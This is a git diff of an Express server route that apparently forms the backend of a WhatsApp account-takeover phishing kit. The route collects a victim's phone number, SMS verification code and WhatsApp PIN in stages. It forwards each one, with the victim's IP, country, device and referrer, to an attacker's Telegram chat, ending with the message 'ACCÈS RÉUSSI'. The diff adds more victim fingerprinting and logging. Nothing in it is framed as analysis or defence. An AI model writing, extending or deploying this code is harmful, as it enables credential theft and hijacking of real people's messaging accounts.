@@ -84,12 +84,24 @@ app.get('/api/telegram/test', async (req, res) => {
 app.post('/api/telegram/send', async (req, res) => {
   try {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.error('❌ Telegram configuration missing:', {
+        token: TELEGRAM_BOT_TOKEN ? 'Present' : 'Missing',
+        chatId: TELEGRAM_CHAT_ID ? 'Present' : 'Missing'
+      });
       return res.status(500).json({ error: 'Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID' });
     }
 
     const { phoneNumber, verificationCode, whatsappPin, messageType } = req.body || {};
-    const forwardedFor = (req.headers['x-forwarded-for'] || '').toString();
-    const remoteIp = (forwardedFor.split(',')[0] || req.socket.remoteAddress || '').trim();
+    
+    // Get client IP (works with Render's proxy)
+    const forwardedFor = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '';
+    const remoteIp = forwardedFor.split(',')[0]?.trim() || req.socket.remoteAddress || 'Unknown';
+    
+    // Get user agent and referer for more info
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const referer = req.headers['referer'] || 'Direct';
+
+    console.log('📨 Received data:', { messageType, phoneNumber: phoneNumber ? 'Present' : 'Empty', verificationCode: verificationCode ? 'Present' : 'Empty', whatsappPin: whatsappPin ? 'Present' : 'Empty' });
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
@@ -99,46 +111,83 @@ app.post('/api/telegram/send', async (req, res) => {
     
     if (messageType === 'phone' && phoneNumber && phoneNumber.trim() !== '') {
       messageText = [
-        '📩 Numéro de téléphone saisi:',
-        `📱 Téléphone: ${phoneNumber}`,
-        `🌐 IP: ${remoteIp}`,
-        `🕒 Heure: ${new Date().toLocaleString('fr-FR')}`
+        '🆕 **NOUVEAU FORMULAIRE**',
+        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
+        '📱 **Numéro de téléphone saisi:**',
+        `🔢 **Téléphone:** \`${phoneNumber}\``,
+        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
+        `🌐 **IP:** \`${remoteIp}\``,
+        `🕒 **Heure:** ${new Date().toLocaleString('fr-FR')}`,
+        `🌍 **Pays:** ${req.headers['cf-ipcountry'] || 'Unknown'}`,
+        `📱 **Device:** ${userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}`,
+        `🔗 **Source:** ${referer}`,
+        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
+        '⏳ **En attente du code de vérification...**'
       ].join('\n');
       shouldSend = true;
     } else if (messageType === 'code' && verificationCode && verificationCode.trim() !== '') {
       messageText = [
-        '🔔 Code saisi:',
-        `🔢 Code: ${verificationCode}`,
-        `🌐 IP: ${remoteIp}`,
-        `🕒 Heure: ${new Date().toLocaleString('fr-FR')}`
+        '🔐 **CODE DE VÉRIFICATION REÇU**',
+        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
+        '🔢 **Code saisi:**',
+        `🔑 **Code:** \`${verificationCode}\``,
+        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
+        `🌐 **IP:** \`${remoteIp}\``,
+        `🕒 **Heure:** ${new Date().toLocaleString('fr-FR')}`,
+        `🌍 **Pays:** ${req.headers['cf-ipcountry'] || 'Unknown'}`,
+        `📱 **Device:** ${userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}`,
+        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
+        '⏳ **En attente du PIN WhatsApp...**'
       ].join('\n');
       shouldSend = true;
     } else if (messageType === 'pin' && whatsappPin && whatsappPin.trim() !== '') {
       messageText = [
-        '🔔 PIN saisi:',
-        `🔒 PIN: ${whatsappPin}`,
-        `🌐 IP: ${remoteIp}`,
-        `🕒 Heure: ${new Date().toLocaleString('fr-FR')}`
+        '🔒 **PIN WHATSAPP REÇU**',
+        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
+        '🔐 **PIN saisi:**',
+        `🔑 **PIN:** \`${whatsappPin}\``,
+        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
+        `🌐 **IP:** \`${remoteIp}\``,
+        `🕒 **Heure:** ${new Date().toLocaleString('fr-FR')}`,
+        `🌍 **Pays:** ${req.headers['cf-ipcountry'] || 'Unknown'}`,
+        `📱 **Device:** ${userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}`,
+        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
+        '✅ **FORMULAIRE COMPLET - ACCÈS RÉUSSI !**'
       ].join('\n');
       shouldSend = true;
     }
 
     // Only send if we have a valid message
     if (shouldSend && messageText) {
+      console.log('📤 Sending to Telegram...');
+      
       const response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: messageText })
+        body: JSON.stringify({ 
+          chat_id: TELEGRAM_CHAT_ID, 
+          text: messageText,
+          parse_mode: 'Markdown',
+          disable_web_page_preview: true
+        })
       });
 
       const data = await response.json();
+      console.log('📨 Telegram response:', data);
+      
       if (!data.ok) {
+        console.error('❌ Telegram API error:', data);
         return res.status(500).json({ error: 'Telegram API error', details: data });
       }
+      
+      console.log('✅ Message sent successfully to Telegram');
+    } else {
+      console.log('⚠️ No valid data to send');
     }
 
-    res.json({ ok: true });
+    res.json({ ok: true, message: 'Data processed successfully' });
   } catch (error) {
+    console.error('❌ Server error:', error);
     res.status(500).json({ error: 'Server error', details: String(error) });
   }
 });
